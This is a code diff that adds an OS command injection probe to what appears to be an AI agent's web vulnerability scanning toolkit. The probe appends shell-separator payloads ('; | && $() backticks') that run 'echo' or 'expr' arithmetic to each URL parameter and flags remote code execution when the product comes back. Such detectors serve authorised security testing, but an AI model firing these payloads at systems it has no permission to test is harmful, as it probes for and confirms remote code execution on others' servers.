@@ -71,6 +71,11 @@ TOOLS_SCHEMA = [
         "parameters": {"url": "string (URL with query parameters)"},
     },
     {
+        "name": "cmdi_probe",
+        "description": "Test OS command injection (RCE): appends a shell command echoing a unique token via several separators (; | && backtick $()) to each parameter and confirms if the token executes server-side. Use on params that may reach a shell (host=, cmd=, ip=, file=, ...).",
+        "parameters": {"url": "string (URL with query parameters)"},
+    },
+    {
         "name": "ssl_audit",
         "description": "SSL/TLS audit: certificate info, cipher suites, vulnerabilities",
         "parameters": {"host": "string"},
@@ -139,6 +144,7 @@ async def run_tool(name: str, params: dict) -> dict:
         "dom_xss_probe": _dom_xss_probe,
         "idor_probe": _idor_probe,
         "ssrf_probe": _ssrf_probe,
+        "cmdi_probe": _cmdi_probe,
         "http_probe": _http_probe,
         "ssl_audit": _ssl_audit,
         "sqlmap_check": _sqlmap_check,
@@ -645,6 +651,62 @@ async def _dom_xss_probe(url: str) -> dict:
         "vulnerable": len(findings) > 0,
         "findings": findings,
         "note": "DOM XSS via headless browser — payload executed and set a window flag.",
+    }
+
+
+async def _cmdi_probe(url: str) -> dict:
+    """Test OS command injection (in-band) via ARITHMETIC evaluation. Append a
+    shell command that multiplies two random numbers, through several separators
+    (; | && `` $()). If the PRODUCT appears in the response, the shell evaluated
+    our expression => RCE-class command injection. This beats reflection false
+    positives: echoing input back shows the expression text, never the computed
+    product. Blind cmdi would need OOB/time-based."""
+    import httpx
+    import random
+    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+
+    if not url.startswith("http"):
+        url = f"http://{url}"
+    parsed = urlparse(url)
+    qs = parse_qs(parsed.query, keep_blank_values=True)
+    if not qs:
+        return {"url": url, "vulnerable": False, "note": "No query parameters to test."}
+
+    findings = []
+    async with httpx.AsyncClient(timeout=10, follow_redirects=True, verify=False) as client:
+        try:
+            baseline = (await client.get(url)).text
+        except Exception:
+            baseline = ""
+
+        for pname in qs:
+            orig = qs[pname][0]
+            a, b = random.randint(100000, 999999), random.randint(11, 97)
+            product = str(a * b)  # 7-8 digits; reflection can't produce this
+            payloads = [
+                f";echo $(({a}*{b}))", f"|echo $(({a}*{b}))", f"&&echo $(({a}*{b}))",
+                f"$(({a}*{b}))", f"$(expr {a} \\* {b})", f"`expr {a} \\* {b}`",
+                f";expr {a} \\* {b}", f"\necho $(({a}*{b}))",
+            ]
+            for inj in payloads:
+                tp = {k: v[0] for k, v in qs.items()}
+                tp[pname] = orig + inj
+                turl = urlunparse(parsed._replace(query=urlencode(tp)))
+                try:
+                    body = (await client.get(turl)).text
+                    if product in body and product not in baseline:
+                        findings.append({"param": pname, "payload": inj,
+                                         "proof": f"shell evaluated {a}*{b}={product} server-side"})
+                        break
+                except Exception:
+                    pass
+
+    return {
+        "url": url,
+        "vulnerable": len(findings) > 0,
+        "findings": findings,
+        "tested_params": list(qs.keys()),
+        "note": "In-band OS command injection confirmed via server-side arithmetic. RCE-class.",
     }
 
 
